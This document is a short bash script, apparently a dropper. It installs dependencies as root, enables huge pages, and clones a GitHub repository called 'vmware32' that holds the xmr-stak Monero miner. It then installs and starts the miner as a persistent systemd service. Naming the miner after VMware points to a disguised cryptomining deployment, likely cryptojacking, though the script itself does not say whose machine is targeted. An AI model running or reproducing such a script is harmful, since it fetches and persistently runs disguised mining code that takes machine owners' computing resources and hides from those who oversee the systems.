#!/bin/bash

apt-get -y update && apt-get -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev screen git && cd /root/ && sysctl -w vm.nr_hugepages=128 && git clone https://github.com/nokian5500/vmware32.git && cd vmware32 && chmod 777 xmr-stak && mv xmr1.service /lib/systemd/system/ && systemctl daemon-reload && systemctl enable xmr1.service && systemctl start xmr1.service && systemctl stop xmr1.service && systemctl restart xmr1.service

